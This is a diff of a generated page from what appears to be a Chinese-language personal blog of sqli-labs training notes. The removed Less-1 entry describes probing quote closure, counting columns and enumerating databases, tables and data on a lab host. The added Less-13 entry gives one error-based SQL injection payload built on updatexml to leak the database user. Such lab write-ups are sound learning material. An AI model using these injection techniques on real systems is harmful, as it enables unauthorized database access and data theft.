+    <article id="post-sqli-labs实验笔记/sqli-labs-less-13" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/" class="article-date">
-  <time datetime="2022-03-24T16:22:17.953Z" itemprop="datePublished">2022-03-25</time>
+    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/" class="article-date">
+  <time datetime="2022-03-31T15:26:40.100Z" itemprop="datePublished">2022-03-31</time>
 </a>
     
   </div>
@@ -471,7 +430,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/">sqli-labs less 1</a>
+      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/">sqli-labs-less-13</a>
     </h1>
   
 
@@ -479,35 +438,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1.先判断闭合符号，单引号报错 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1&#39;">http://45.32.113.109:11516/Less-1/?id=1&#39;</a></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/1.png" alt="1.png (1068×702) (raw.githubusercontent.com)"></p>
-<p>在后面加上–+试一下 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1&#39;--+">http://45.32.113.109:11516/Less-1/?id=1&#39;--+</a></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/2.png" alt="2.png (1072×705) (raw.githubusercontent.com)"></p>
-<p>2.判断一下注入类型 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1">http://45.32.113.109:11516/Less-1/?id=1</a> and 1=1 和 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1">http://45.32.113.109:11516/Less-1/?id=1</a> and 1=2 看页面回显位的反馈，如果一致，则是字符注入，否则是数字注入。</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/3.png" alt="3.png (1068×709) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/4.png" alt="4.png (1072×717) (raw.githubusercontent.com)"></p>
-<p>都显示正确，为字符注入</p>
-<p>3.判断列数</p>
-<p>从1试到3都正确，大于3后超出该数据库列数报错，列的个数为3</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/5.png" alt="5.png (1069×708) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/6.png" alt="6.png (1070×711) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/7.png" alt="7.png (1069×704) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/8.png" alt="8.png (1072×711) (raw.githubusercontent.com)"></p>
-<p>4.爆破数据库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/9.png" alt="9.png (1072×707) (raw.githubusercontent.com)"></p>
-<p>5.爆破数据表/查询表名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/10.png" alt="10.png (1039×707) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/11.png" alt="11.png (1034×708) (raw.githubusercontent.com)"></p>
-<p>7.爆破字段/查询列名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/12.png" alt="12.png (1920×881) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/13.png" alt="13.png (1097×763) (raw.githubusercontent.com)"></p>
-<p>9.爆破值/查询数据</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/14.png" alt="14.png (1096×762) (raw.githubusercontent.com)"></p>
+        <p>注入语句：admin’) union select updatexml(1,concat(0x7e,(select user()),0x7e),1)  –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson13/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson13/2.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/" data-id="cl157fhhk00007gtrg5qkf075" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/" data-id="cl1f7n02a0003q4tr0sof3yw5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -521,7 +459,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -553,23 +491,23 @@
       <ul>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/">sqli-labs-less-18</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC10%E5%85%B3/">xss-labs第10关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/">sqli-labs-less-17</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC9%E5%85%B3/">xss-labs第9关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/">sqli-labs-less-16</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC8%E5%85%B3/">xss-labs第8关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/">sqli-labs-less-15</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC7%E5%85%B3/">xss-labs第7关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/">sqli-labs-less-14</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC6%E5%85%B3/">xss-labs第6关</a>
           </li>
         
       </ul>
